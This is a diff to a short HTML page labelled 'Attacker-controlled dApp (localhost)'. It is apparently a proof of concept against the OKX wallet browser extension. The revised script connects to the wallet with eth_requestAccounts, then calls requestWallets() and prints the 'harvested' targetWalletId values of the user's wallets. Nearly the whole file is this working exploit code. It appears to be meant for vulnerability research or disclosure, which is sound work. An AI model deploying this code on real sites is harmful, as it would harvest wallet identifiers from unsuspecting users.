@@ -3,25 +3,16 @@
 <body style="font-family:monospace;padding:20px">
 <h3>Attacker-controlled dApp (localhost)</h3>
 <button id="connect" onclick="connect()">Connect Wallet</button>
-<button id="rw" onclick="readWallets()" style="display:none">requestWallets()</button>
 <pre id="out" style="white-space:pre-wrap;background:#eee;padding:10px">waiting...</pre>
 <script>
-function log(x){ document.getElementById('out').textContent = typeof x === 'string' ? x : JSON.stringify(x, null, 2); }
+function log(x){ document.getElementById('out').textContent = x; }
 async function connect(){
   log('calling connect()...');
   try {
-    const accounts = await window.okxwallet.request({ method: 'eth_requestAccounts' });
-    log('CONNECTED accounts: ' + JSON.stringify(accounts));
-    document.getElementById('rw').style.display = 'inline';
+    await window.okxwallet.request({ method: 'eth_requestAccounts' });
+    const wallets = await window.okxwallet.requestWallets();
+    log('connected. harvested targetWalletId:\n\n' + wallets.map(w => w.targetWalletId).join('\n'));
   } catch(e) { log('connect error: ' + (e.message || e)); }
 }
-async function readWallets(){
-  log('calling requestWallets()...');
-  try {
-    const wallets = await window.okxwallet.requestWallets();
-    log(wallets);
-  } catch(e) { log('requestWallets error: ' + (e.message || e)); }
-}
-window.__attacker = { log };
 </script>
 </body></html>
